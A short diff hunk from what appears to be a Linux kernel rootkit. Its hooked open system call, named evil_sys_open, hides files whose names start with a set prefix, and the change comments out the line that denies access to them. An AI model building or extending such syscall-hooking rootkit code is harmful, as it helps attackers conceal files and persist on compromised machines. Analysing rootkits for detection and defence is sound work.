@@ -105,7 +105,7 @@ asmlinkage long evil_sys_open(const char __user *filename,	int flags, int mode)
   if (!strncmp(basename(filename), HIDE_PREFIX, strlen(HIDE_PREFIX)))
   {
     printk("opening hidden file [%s] denied\n", filename);
-    return ENOENT;
+    //return ENOENT;
   }
 
   return orig_sys_open(filename, flags, mode);
